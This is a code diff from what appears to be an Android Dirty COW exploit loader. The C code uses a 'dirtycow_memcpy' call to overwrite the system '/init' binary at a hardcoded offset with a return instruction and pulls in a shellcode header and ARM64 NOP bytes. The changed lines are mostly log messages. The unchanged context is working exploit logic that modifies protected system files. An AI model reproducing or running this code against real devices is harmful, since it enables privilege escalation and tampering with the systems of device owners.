@@ -1,9 +1,8 @@
-#include <android/log.h>
 #include <unistd.h>
 #include <sys/system_properties.h>
 
 #include "shellcode.h"
-#include "shared.h"
+#include "shared_memcpy.h"
 
 // offset into the init binary
 #define INIT_OFFSET (0x401b98 - 0x4001c0 + 0x1c0)
@@ -12,7 +11,7 @@
 #define NOP "\x1f\x20\x03\xd5"
 
 int main(int argc, const char *argv[]) {
-	LOGV("[+] load started");
+	LOGV("[+] load started, don't touch anything!");
 
 	LOGV("[+] overwriting init to terminate early");
 	if( dirtycow_memcpy("/init", INIT_OFFSET, 4, RET) ) {
@@ -32,7 +31,7 @@ int main(int argc, const char *argv[]) {
 		return 1;
 	}
 
-	LOGV("[+] load done!");
+	LOGV("[+] load done! -- turn off Mobile Hot Spot before continuing...");
 
 	return 0;
 }
